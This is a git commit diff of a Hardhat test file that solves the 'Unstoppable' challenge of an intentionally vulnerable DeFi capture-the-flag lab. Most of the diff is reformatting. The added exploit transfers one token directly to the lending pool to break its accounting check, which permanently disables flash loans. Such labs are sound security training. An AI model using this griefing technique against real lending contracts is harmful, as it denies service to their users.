811bc203137c8b2df136acb8e548d96397bf9c0e
Shadi Barhoumi <shadibarhoumi@gmail.com>
2022-02-04 14:00:48 -0700

    Challenge 1 Solution

--- test/unstoppable/unstoppable.challenge.js
+++ test/unstoppable/unstoppable.challenge.js
@@ -1,53 +1,54 @@
-const { ethers } = require('hardhat');
-const { expect } = require('chai');
+const { ethers } = require('hardhat')
+const { expect } = require('chai')
 
 describe('[Challenge] Unstoppable', function () {
-    let deployer, attacker, someUser;
+  let deployer, attacker, someUser
 
-    // Pool has 1M * 10**18 tokens
-    const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
-    const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
+  // Pool has 1M * 10**18 tokens
+  const TOKENS_IN_POOL = ethers.utils.parseEther('1000000')
+  const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100')
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
-        [deployer, attacker, someUser] = await ethers.getSigners();
+    ;[deployer, attacker, someUser] = await ethers.getSigners()
 
-        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
-        const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer);
+    const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer)
+    const UnstoppableLenderFactory = await ethers.getContractFactory('UnstoppableLender', deployer)
 
-        this.token = await DamnValuableTokenFactory.deploy();
-        this.pool = await UnstoppableLenderFactory.deploy(this.token.address);
+    this.token = await DamnValuableTokenFactory.deploy()
+    this.pool = await UnstoppableLenderFactory.deploy(this.token.address)
 
-        await this.token.approve(this.pool.address, TOKENS_IN_POOL);
-        await this.pool.depositTokens(TOKENS_IN_POOL);
+    const balance = await this.token.balanceOf(deployer.address)
 
-        await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE);
+    // deployer approves pool
+    await this.token.approve(this.pool.address, TOKENS_IN_POOL)
+    // deployer deposits tokens
+    await this.pool.depositTokens(TOKENS_IN_POOL)
 
-        expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
+    await this.token.transfer(attacker.address, INITIAL_ATTACKER_TOKEN_BALANCE)
 
-        expect(
-            await this.token.balanceOf(attacker.address)
-        ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
+    expect(await this.token.balanceOf(this.pool.address)).to.equal(TOKENS_IN_POOL)
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
-    });
+    expect(await this.token.balanceOf(attacker.address)).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE)
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
-    });
+    // Show it's possible for someUser to take out a flash loan
+    const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser)
+    this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address)
+    await this.receiverContract.executeFlashLoan(10)
+  })
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+  it('Exploit', async function () {
+    const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', attacker)
+    receiver = await ReceiverContractFactory.deploy(this.pool.address)
+    this.token.connect(attacker).approve(this.pool.address, TOKENS_IN_POOL)
+    this.token.connect(attacker).transfer(this.pool.address, ethers.utils.parseEther('1'))
+  })
 
-        // It is no longer possible to execute flash loans
-        await expect(
-            this.receiverContract.executeFlashLoan(10)
-        ).to.be.reverted;
-    });
-});
+  after(async function () {
+    /** SUCCESS CONDITIONS */
+
+    // It is no longer possible to execute flash loans
+    await expect(this.receiverContract.executeFlashLoan(10)).to.be.reverted
+  })
+})
